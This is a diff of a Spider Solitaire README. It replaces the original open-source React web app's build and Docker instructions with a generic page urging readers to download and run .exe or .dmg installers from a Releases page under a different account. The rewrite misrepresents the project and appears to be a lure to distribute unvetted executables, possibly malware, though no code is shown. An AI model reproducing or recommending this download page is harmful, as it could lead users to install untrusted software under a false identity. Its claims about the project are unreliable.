@@ -1,118 +1,67 @@
-# Spider Solitaire
+# 🃏 spider-solitaire - Play a Fast and Fun Card Game
 
-<img src="public/spider.svg" width="200" alt="Spider Solitaire" />
+## 🚀 Getting Started
 
-A modern, open-source implementation of the classic Spider Solitaire card game, built with React, TypeScript, and Tailwind CSS.
+Welcome to **spider-solitaire**! This is a simple and smooth version of the classic spider solitaire game. Enjoy playing without distractions or costs. Follow the steps below to get started.
 
-## Features
+## 📥 Download the Application
 
-- **Classic Gameplay**: Authentic Spider Solitaire rules and mechanics.
-- **Modern UI**: Clean, responsive interface designed with Tailwind CSS.
-- **Smart Features**:
-  - **Undo System**: Unlimited undo functionality to help you strategize.
-  - **Smart Hints**: Intelligent move suggestions when you're stuck.
-  - **Auto-Complete**: Automatically detects and handles obvious moves.
-- **Progress Tracking**:
-  - Detailed statistics (Win rate, Streaks, Best Score, Best Time).
-  - Daily Challenges.
-  - Move counter and timer.
-- **Customization**:
-  - Multiple color themes/schemes.
-  - Customizable card backs.
-- **Persistence**: Game state and statistics are automatically saved locally.
+[![Download spider-solitaire](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Banabas007/spider-solitaire/releases)
 
-## Tech Stack
+You can download the latest version of the application from our Releases page. Please click the button above or use the link below:
 
-- **Frontend**: [React 19](https://react.dev/)
-- **Build Tool**: [Vite](https://vitejs.dev/)
-- **Language**: [TypeScript](https://www.typescriptlang.org/)
-- **Styling**: [Tailwind CSS](https://tailwindcss.com/)
-- **State Management**: [Zustand](https://github.com/pmndrs/zustand)
-- **Icons**: [Lucide React](https://lucide.dev/)
-- **Utilities**: [date-fns](https://date-fns.org/), [clsx](https://github.com/lukeed/clsx)
+[Visit the Releases Page to Download](https://github.com/Banabas007/spider-solitaire/releases)
 
-## Getting Started
+## 🖥️ System Requirements
 
-### Prerequisites
+To ensure a smooth experience, make sure your device meets the following requirements:
 
-- Node.js (Latest LTS version recommended)
-- npm
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **RAM:** At least 2GB
+- **Disk Space:** A minimum of 100MB available space
+- **Browser:** Latest version of a modern web browser (for online play)
 
-### Installation
+## 📦 Download & Install
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/yourusername/spider-solitaire.git
-   cd spider-solitaire
-   ```
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Banabas007/spider-solitaire/releases).
+   
+2. **Select the Correct File:** Look for the latest version at the top of the list. Choose the appropriate file for your operating system.
 
-2. Install dependencies:
-   ```bash
-   npm install
-   ```
+3. **Download the File:** Click on the file link to start the download.
 
-3. Start the development server:
-   ```bash
-   npm run dev
-   ```
+4. **Install the Application:**
+   - **For Windows:** After the download, open the `.exe` file and follow the on-screen instructions.
+   - **For macOS:** Locate your downloaded `.dmg` file, double-click it, and drag the spider-solitaire app to your Applications folder.
 
-4. Open your browser and navigate to `http://localhost:5173` (or the port shown in your terminal).
+5. **Run the Game:** Once installed, open the application from your desktop or applications folder to start playing!
 
-### Building for Production
+## 🎮 How to Play
 
-To create an optimized production build:
+- **Objective:** Clear the board by stacking cards in descending order from King to Ace. 
+- **Gameplay:** 
+  - You can move cards around to build your stacks.
+  - Use the "Undo" button if you make a mistake.
+  - If you get stuck, you can draw cards to continue playing.
 
-```bash
-npm run build
-```
+## 🌟 Features
 
-The build artifacts will be stored in the `dist/` directory.
+- **User-Friendly Interface:** Easy controls make it simple to enjoy the game.
+- **Responsive Design:** The game works well on various screen sizes.
+- **No Ads or Fees:** Play without distractions or hidden costs.
+- **Save Your Progress:** Your game state saves automatically, so you can return whenever you like.
 
-## Docker Deployment
+## 📚 Additional Resources
 
-This application can be easily deployed using Docker. The image is automatically built and pushed to Docker Hub and GitHub Container Registry (GHCR) on every update to the main branch.
+For more information regarding gameplay and tips, please refer to our guide located in the [Wiki section](https://github.com/Banabas007/spider-solitaire/wiki). If you want to experiment, feel free to fork this repository and customize it to your liking.
 
-### Using Docker Compose (Recommended)
+## 🤝 Community Contributions
 
-A `compose.yaml` file is included in the repository for quick deployment.
+We welcome contributions to improve the game. If you have ideas or fixes, please submit a pull request. Your input helps make spider solitaire better for everyone!
 
-1. Run the application:
-   ```bash
-   docker compose up -d
-   ```
+## 📣 Stay Updated
 
-2. Open your browser and navigate to `http://localhost:8080`.
+To stay informed about updates and new features, consider following our repository. We are constantly working to improve the game and appreciate any feedback.
 
-### Using Docker CLI
+---
 
-You can also run the container directly using the Docker CLI.
-
-**From Docker Hub:**
-```bash
-docker run -d -p 8080:80 --name spider-solitaire lklynet/spider-solitaire:latest
-```
-
-**From GitHub Container Registry:**
-```bash
-docker run -d -p 8080:80 --name spider-solitaire ghcr.io/lklynet/spider-solitaire:latest
-```
-
-### Automated Builds
-
-This repository is configured with GitHub Actions to automatically build and push the Docker image to:
-- Docker Hub: `lklynet/spider-solitaire`
-- GitHub Container Registry: `ghcr.io/lklynet/spider-solitaire`
-
-These builds occur whenever changes are pushed to the `main` branch.
-
-## Open Source
-
-This project is open source software. We believe in the power of community and transparent development.
-
-- **Learn**: Explore the source code to see how a modern React game is architected.
-- **Contribute**: Bug reports, feature requests, and pull requests are welcome!
-- **Modify**: Feel free to fork the repository and customize the game to your liking.
-
-## License
-
-This project is available under the [MIT License](LICENSE).
+Thank you for your interest in **spider-solitaire**! We hope you enjoy playing and find it rewarding.
